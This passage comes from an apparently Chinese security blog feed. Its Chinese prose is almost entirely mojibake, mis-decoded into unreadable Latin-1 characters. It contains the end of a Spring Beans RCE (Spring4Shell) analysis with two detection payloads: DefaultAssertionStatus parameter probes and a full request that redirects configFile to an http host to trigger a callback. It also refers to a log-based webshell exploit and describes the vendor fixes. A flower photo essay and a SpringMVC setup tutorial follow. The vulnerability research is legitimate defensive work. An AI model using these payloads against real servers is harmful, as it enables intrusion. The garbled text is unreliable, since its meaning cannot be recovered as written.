<p>æˆ‘ä»¬ä¼šå‘ç°ç»ˆç«¯å±…ç„¶è¾“å‡ºäº†10ï¼è¿™å’Œæˆ‘ä»¬ä¹‹å‰æ‰€æƒ³çš„ä¸ä¸€æ ·ï¼Œæ²¡æœ‰setæ–¹æ³•å±…ç„¶ä¹Ÿå¯ä»¥ç»‘å®šç§æœ‰å±æ€§çš„å€¼ã€‚</p>

<p>å…·ä½“ä½ç½®åœ¨ï¼š<code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor.processKeyedProperty</code></p>

<p>å®é™…ä¸Šé™¤äº†Arrayç±»å‹ï¼ŒMapã€Setç±»å‹ä¹ŸåŒæ ·å¯ä»¥ç›´æ¥èµ‹å€¼ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220422190501.png" alt="image-20220421182917229" /></p>

<p>æˆ‘è®¤ä¸ºè¿™åº”è¯¥åªæ˜¯å¯¹ç‰¹å®šç±»å‹çš„ä¸€ç§è¡¥å……ï¼Œä½†æœ‰ä¸å°‘æ–‡ç« éƒ½æŠŠè¿™ä¸ªç‰¹æ€§çº³å…¥åˆ°äº†æœ€åçš„å±æ€§æ³¨å…¥ä¸Šå»ï¼Œè¿™æ˜¯æˆ‘ä¸å¤ªèƒ½ç†è§£çš„ç‚¹ï¼Œå› ä¸ºç›®å‰æ¥çœ‹æˆ‘ä»¬åˆ©ç”¨çš„å±æ€§è¿˜æ²¡æœ‰éœ€è¦ç”¨åˆ°è¿™ä¸ªç‰¹æ€§çš„ã€‚</p>

<h2 id="å•åº”ç”¨å¯åŠ¨ä¼šå—å½±å“å—">å•åº”ç”¨å¯åŠ¨ä¼šå—å½±å“å—ï¼Ÿ</h2>

<p>ä¸‹å›¾ä¸ºtomcat waråŒ…å¯åŠ¨ï¼Œè·å–åˆ°çš„classLoaderï¼šWebappClassLoader</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175457.png" alt="image-20220421110653486" /></p>

<p>ä¸‹å›¾ä¸ºå•åº”ç”¨ï¼ˆspringboot jarï¼‰å¯åŠ¨ï¼Œè·å–åˆ°çš„classLoaderï¼šJDKè‡ªå¸¦çš„AppClassLoader</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175459.png" alt="image-20220421110809107" /></p>

<p>ä¸¤è€…çš„å·®åˆ«åœ¨äºè·å–åˆ°classLoaderçš„ååˆ©ç”¨ä¸Šï¼ŒWebappClassLoaderé‡‡ç”¨äº†ç±»éš”ç¦»æœºåˆ¶(ä¹‹å‰RASPè¿™å—è¸©äº†å¥½å¤šå‘)ï¼Œæ‹¥æœ‰æ›´å¤šçš„å±æ€§ï¼Œæ‰€ä»¥åªæ˜¯åœ¨æ‹“å±•é¢ä¸Šæœ‰æ‰€å·®å¼‚ï¼Œä¸è¿‡æˆ‘ä»¬ç›®å‰æ‰€å·²çŸ¥çš„åˆ©ç”¨æ–¹æ³•éƒ½æ˜¯åœ¨WebappClassLoaderä¸Šã€‚</p>

<h2 id="æ— å®³æ¢æµ‹">æ— å®³æ¢æµ‹</h2>

<p>å¦‚æœæˆ‘ä»¬æƒ³å†™ä¸€ä¸ªpocï¼Œæ‰¹é‡éªŒè¯æ¼æ´ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p>

<p>å½“ç„¶å¯ä»¥ç›´æ¥ç”¨ç°æœ‰expçš„æ–¹å¼ï¼Œæ—¥å¿—å†™é©¬ã€‚</p>

<p>ä½†æ˜¯ä½œä¸º <strong>Proof Of Concept</strong>ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›æŠŠä¾µå…¥æ€§åŒ–ä¸ºæœ€å°ï¼Œè¿™æ ·æ¥çœ‹ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è‚¯å®šä¸åˆé€‚ï¼Œè€Œä¸”è¿™æ ·ç”šè‡³æœ‰å¯èƒ½ä¼šæŠŠä¸šåŠ¡æ‰“å´©ï¼Œæˆ‘ä»¬éœ€è¦ä»å…¶ä»–å±æ€§å…¥æ‰‹ã€‚</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">class.module.classLoader.DefaultAssertionStatus</code>:</li>
</ol>

<p>è¯¥å±æ€§çš„setæ–¹æ³•ä¼ å‚ä¸ºboolç±»å‹ï¼Œå¦‚æœä¼ å…¥0ã€1æ­£å¸¸ï¼Œå…¶ä»–å­—ç¬¦è¿”å›400ï¼Œå¯ä½œä¸ºåˆ¤æ–­ä¾æ®ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.DefaultAssertionStatus=0
class.module.classLoader.DefaultAssertionStatus=x
</code></pre></div></div>

<p>è¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘ä¸¤æ¬¡åŒ…ï¼Œä»ä¸¤æ¬¡çš„è¿”å›çŠ¶æ€ç è¿›è¡Œåˆ¤æ–­ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231217.png" alt="image-20220421225051339" /></p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">class.module.classLoader.resources.context.configFile</code></li>
</ol>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231222.png" alt="image-20220421225545352" /></p>

<p>ä½äº<code class="language-plaintext highlighter-rouge">org.apache.catalina.core.StandardContext</code>çš„<code class="language-plaintext highlighter-rouge">configFile</code>å±æ€§ä¸ºURLç±»å‹ï¼Œ é»˜è®¤ä¸ºfileåè®®ï¼Œè®¿é—®ç¼“å­˜åœ¨æœ¬åœ°çš„xmlæ–‡ä»¶ï¼Œå¯ä¿®æ”¹ä¸ºhttpåè®®è¾¾åˆ°åè¿æ£€æµ‹çš„ç›®çš„ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/login5?username=theoyu&amp;class.module.classLoader.resources.context.configFile=http://127.0.0.1:20022&amp;class.module.classLoader.resources.context.configFile.content.config=config.conf
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231225.png" alt="image-20220421231211477" /></p>

<p>ä»¥ä¸Šä¸¤ç§æ–¹æ³•å‡å·²æ·»åŠ è‡³ <a href="https://github.com/yuuuuu422/Gopo">Gopo</a>çš„YAMLè§„åˆ™ã€‚</p>

<h2 id="æ¼æ´ä¿®å¤">æ¼æ´ä¿®å¤</h2>

<p>å’Œ CVE-2010-1622 æ¼æ´ä¸€æ ·ï¼ŒSpringå®˜æ–¹å’ŒTomcatéƒ½å¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œäº†ä¿®å¤ã€‚</p>

<p>Springå®˜æ–¹åšäº†ä¸¤ç‚¹é™åˆ¶ï¼Œä¸€æ˜¯æŠŠé»‘åå•æ”¹ä¸ºäº†ç™½åå•ï¼šè¦æ±‚<code class="language-plaintext highlighter-rouge">pd.getName</code>å¿…é¡»æ˜¯ä»¥ã€Nameã€ç»“å°¾ï¼Œè€Œæ˜¯è¿”å›çš„ç±»å‹ä¸èƒ½ä¸º<code class="language-plaintext highlighter-rouge">classLoader</code>ç±»å‹ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234356.png" alt="image-20220421191637423" /></p>

<p>Tomcatåˆ™ç›´æ¥æŠŠè·å–resourcesçš„æ–¹æ³•ç»™æ”¹æˆäº†<code class="language-plaintext highlighter-rouge">return null</code>ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234400.png" alt="image-20220421190048440" /></p>

<p>å¦‚æœè¿˜æƒ³è¿›ä¸€æ­¥ç»•è¿‡çš„è¯ï¼Œå¯ä»¥é€šè¿‡ â€¦ å¦‚æœæˆ‘çŸ¥é“çš„è¯ â€¦</p>

<h2 id="å‚è€ƒ">å‚è€ƒ</h2>

<ul>
  <li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ JavaBean</a></li>
  <li><a href="https://cloud.tencent.com/developer/article/1035297">Struts2 S2-020åœ¨Tomcat 8ä¸‹çš„å‘½ä»¤æ‰§è¡Œåˆ†æ</a></li>
  <li>
    <p><a href="https://xz.aliyun.com/t/11129#toc-0">Spring Beans RCEåˆ†æ</a></p>
  </li>
  <li>
    <p><a href="http://rui0.cn/archives/1158">SpringMVCæ¡†æ¶ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´(CVE-2010-1622)åˆ†æ</a></p>
  </li>
  <li><a href="https://blog.csdn.net/charles_neil/article/details/114460702">JDK9 - Module</a></li>
</ul>]]></content><author><name>Theoyu</name></author><category term="VUL-Reproduce" /><category term="JAVA" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">å­¦æ ¡é‡Œçš„èŠ±å¼€äº†</title><link href="https://theoyu.top/2022/essay/TheFlower" rel="alternate" type="text/html" title="å­¦æ ¡é‡Œçš„èŠ±å¼€äº†" /><published>2022-04-09T00:00:00+08:00</published><updated>2022-04-09T00:00:00+08:00</updated><id>https://theoyu.top/2022/essay/TheFlower</id><content type="html" xml:base="https://theoyu.top/2022/essay/TheFlower"><![CDATA[<!--more-->

<div><iframe class="extensions extensions--audio" width="330" height="86" src="//music.163.com/outchain/player?type=2&amp;id=41632486&amp;auto=1&amp;height=66" frameborder="no" border="0" marginwidth="0" marginheight="0">
</iframe>
</div>

<p>å‘ç°ä¹‹å‰åšå®¢é‡Œå…¨æ˜¯æŠ€æœ¯æˆ–è€…å­¦ä¹ ç›¸å…³çš„æ–‡ç« ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯åº”è¯¥å¥½å¥½ç»è¥ä¸€ä¸‹ã€‚</p>

<p>åˆšå¥½æ˜¥å¤©åˆ°äº†ï¼Œå­¦æ ¡é‡Œçš„èŠ±ä¹Ÿéƒ½å¼€äº†ï¼Œé‚£å°±å¸¦å¤§å®¶ä¸€èµ·çœ‹çœ‹æˆ‘ä»¬å­¦æ ¡çš„èŠ±å§ï½</p>

<p><img src="/assets/images/image-20220409131808085.png" alt="image-20220409131808085" /></p>

<p><img src="/assets/images/image-20220409131835381.png" alt="image-20220409131835381" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">ç¬¬ä¸€æ¬¡på›¾ï¼Œæ›å…‰åº¦å¥½åƒè°ƒé«˜äº†ğŸ¥²</center>

<p><img src="/assets/images/image-20220410193632010.png" alt="image-20220410193632010" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">æœ€è¿‘çœ‹å·²æ˜¯ç»¿è‰²</center>

<p><img src="/assets/images/image-20220409131913827.png" alt="image-20220409131913827" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">å¤©ç©ºå¾ˆè“è¯¶ï½</center>

<p><img src="/assets/images/image-20220420131844261.png" alt="image-20220420131844261" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">Its name is heather : (</center>

<p><img src="/assets/images/image-20220409134551627.png" alt="image-20220409134551627" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">ä»æ¨±èŠ±å¤§é“ğŸ›¹ä¸‹æ¥çœŸæ»´çˆ½ï½</center>

<p><img src="/assets/images/image-20220420132254262.png" alt="image-20220420132254262" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">ä¿ºç§çš„åº·ä¹ƒé¦¨</center>

<p><img src="/assets/images/image-20220409142047296.png" alt="image-20220409142047296" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">ttæ‹çš„è¿™å¼ å¾ˆæœ‰æ„Ÿè§‰</center>

<p><img src="/assets/images/image-20220409134531053.png" alt="image-20220409134531053" /></p>

<p><img src="/assets/images/image-20220421175840298.png" alt="image-20220421175840298" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">ç»ˆæœ‰å‡‹è°¢çš„ä¸€å¤©</center>

<p><img src="/assets/images/image-20220409131957709.png" alt="image-20220409131957709" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">Siyuçš„æ„å›¾å’Œé€‰æ™¯éƒ½æ„Ÿè§‰å¾ˆå·§å¦™</center>

<blockquote>
  <p>å†è¿‡ä¸€ä¸ªæ˜¥å¤©ï¼Œå°±æ˜¯è¯¥åˆ†åˆ«çš„æ—¶å€™äº†</p>
</blockquote>]]></content><author><name>Theoyu</name></author><category term="essay" /><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">study springMVC åŸºç¡€é…ç½®</title><link href="https://theoyu.top/2022/springMVC01" rel="alternate" type="text/html" title="study springMVC åŸºç¡€é…ç½®" /><published>2022-04-06T00:00:00+08:00</published><updated>2022-04-06T00:00:00+08:00</updated><id>https://theoyu.top/2022/springMVC01</id><content type="html" xml:base="https://theoyu.top/2022/springMVC01"><![CDATA[<p>æ¥è§¦javaä»¥æ¥webç›¸å…³çš„ä¸œè¥¿éƒ½æ˜¯springbootå¼€ç®±å³ç”¨ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰é…ç½®è¿‡springMVCï¼Œæ‰“ç®—è¿˜æ˜¯ä»0åˆ°1æ¥è§¦æ¥è§¦ã€‚</p>

<!--more-->

<h2 id="0x00-spring-mvcæ˜¯ä»€ä¹ˆ">0x00 spring MVCæ˜¯ä»€ä¹ˆ</h2>

<ul>
  <li>
    <p>æ•°æ®æ¨¡å‹å±‚ï¼ˆModelï¼‰ï¼šæ¨¡å‹å¯¹è±¡æ‹¥æœ‰æœ€å¤šçš„å¤„ç†ä»»åŠ¡ï¼Œæ˜¯åº”ç”¨ç¨‹åºçš„ä¸»ä½“éƒ¨åˆ†ï¼Œå®ƒè´Ÿè´£æ•°æ®é€»è¾‘ï¼ˆä¸šåŠ¡è§„åˆ™ï¼‰çš„å¤„ç†å’Œå®ç°æ•°æ®æ“ä½œï¼ˆå³åœ¨æ•°æ®åº“ä¸­å­˜å–æ•°æ®ï¼‰ã€‚</p>
  </li>
  <li>
    <p>è§†å›¾å±‚ï¼ˆViewï¼‰ï¼šè´Ÿè´£æ ¼å¼åŒ–æ•°æ®å¹¶æŠŠå®ƒä»¬å‘ˆç°ç»™ç”¨æˆ·ï¼ŒåŒ…æ‹¬æ•°æ®å±•ç¤ºã€ç”¨æˆ·äº¤äº’ã€æ•°æ®éªŒè¯ã€ç•Œé¢è®¾è®¡ç­‰åŠŸèƒ½ã€‚</p>
  </li>
  <li>
    <p>æ§åˆ¶å±‚ï¼ˆControllerï¼‰ï¼šè´Ÿè´£æ¥æ”¶å¹¶è½¬å‘è¯·æ±‚ï¼Œå¯¹è¯·æ±‚è¿›è¡Œå¤„ç†åï¼ŒæŒ‡å®šè§†å›¾å¹¶å°†å“åº”ç»“æœå‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
  </li>
</ul>

<p>ç½‘ä¸Šéšä¾¿æœç´¢å°±æœ‰å¾ˆå¤šå…³äºMVCçš„æ¦‚å¿µï¼Œåœ¨springä¸­ï¼ŒJavaBeanä½œä¸ºæ•°æ®åˆ†è£…(Model)ï¼ŒJSPå¯ç”¨ä½œæ•°æ®æ˜¾ç¤º(View)ï¼ŒServletåˆ™æ˜¯å¤„ç†ç”¨æˆ·è¯·æ±‚(Controller)ï¼Œåˆšå¥½ä¸€ä¸€å¯¹åº”ä¸Šè¿°çš„MVCã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120311.png" alt="image-20220409235704925" /></p>

<h2 id="0x01-å¿«é€Ÿå¯ç”¨">0x01 å¿«é€Ÿå¯ç”¨</h2>

<p>åˆ›å»ºé¡¹ç›®é€‰æ‹© <strong>Java Enterprise</strong></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120314.png" alt="image-20220409225544372" /></p>

<p>åœ¨<strong>dependencies</strong>ä¸­é€‰æ‹©ä»¥ä¸‹ä¸¤é¡¹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120318.png" alt="image-20220409225923947" /></p>

<p>ä¹‹ååœ¨<code class="language-plaintext highlighter-rouge">pom.xml</code>ä¸­æ·»åŠ ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;properties&gt;</span>
        <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
        <span class="nt">&lt;maven.compiler.target&gt;</span>1.8<span class="nt">&lt;/maven.compiler.target&gt;</span>
        <span class="nt">&lt;maven.compiler.source&gt;</span>1.8<span class="nt">&lt;/maven.compiler.source&gt;</span>
        <span class="nt">&lt;junit.version&gt;</span>5.8.1<span class="nt">&lt;/junit.version&gt;</span>
        <span class="nt">&lt;spring.version&gt;</span>4.3.6.RELEASE<span class="nt">&lt;/spring.version&gt;</span>
    <span class="nt">&lt;/properties&gt;</span>
......
<span class="nt">&lt;dependencies&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javaee-web-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>8.0.1<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax.mvc<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javax.mvc-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.junit.jupiter<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>junit-jupiter-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${junit.version}<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.junit.jupiter<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>junit-jupiter-engine<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${junit.version}<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-core<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-beans<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-context-support<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-aop<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-aspects<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-expression<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-jdbc<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-orm<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-tx<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-web<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.2.13.RELEASE<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-webmvc<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.2.13.RELEASE<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;/dependencies&gt;</span>
</code></pre></div></div>

<p>åˆå§‹åŒ–æˆåŠŸåï¼Œæˆ‘ä»¬çœ‹çœ‹å½“å‰çš„ç»“æ„æ˜¯æ€æ ·çš„ï¼š</p>

<p><strong>index.jsp</strong> :</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html; charset=UTF-8"</span><span class="na"> pageEncoding=</span><span class="s">"UTF-8"</span> <span class="nt">%&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>JSP - Hello World<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;&lt;%=</span> <span class="s">"Hello World!"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"hello-servlet"</span><span class="nt">&gt;</span>Hello Servlet<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><strong>HelloServlet</strong> :</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@WebServlet</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">"helloServlet"</span><span class="o">,</span> <span class="n">value</span> <span class="o">=</span> <span class="s">"/hello-servlet"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">message</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">message</span> <span class="o">=</span> <span class="s">"Hello World!"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/html"</span><span class="o">);</span>

        <span class="c1">// Hello</span>
        <span class="nc">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;html&gt;&lt;body&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;h1&gt;"</span> <span class="o">+</span> <span class="n">message</span> <span class="o">+</span> <span class="s">"&lt;/h1&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;/body&gt;&lt;/html&gt;"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>é»˜è®¤è®¿é—® <strong>index.jsp</strong>,ç‚¹å‡»é“¾æ¥å¯ä»¥è·³è½¬åˆ°<strong>HelloServlet</strong>ï¼Œä½†è¿™å¹¶ä¸æ˜¯mvcÂ Â ï¼Œåªæ˜¯ç®€å•çš„jsp+servletè·³è½¬ã€‚</p>

<p>ä¸‹é¢æˆ‘ä»¬åœ¨ <code class="language-plaintext highlighter-rouge">/WEB-INF/jsp/</code> ä¸‹åˆ›å»º Viewï¼š login.jsp (å†…å®¹æ— æ‰€è°“)</p>

<blockquote>
  <p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>
</blockquote>

<p>åˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoginController</span> <span class="o">{</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">ModelAndView</span> <span class="nf">login</span><span class="o">(){</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">ModelAndView</span><span class="o">(</span><span class="s">"/WEB-INF/jsp/login.jsp"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login2"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login2</span><span class="o">(){</span>
        <span class="k">return</span> <span class="s">"/WEB-INF/jsp/login.jsp"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

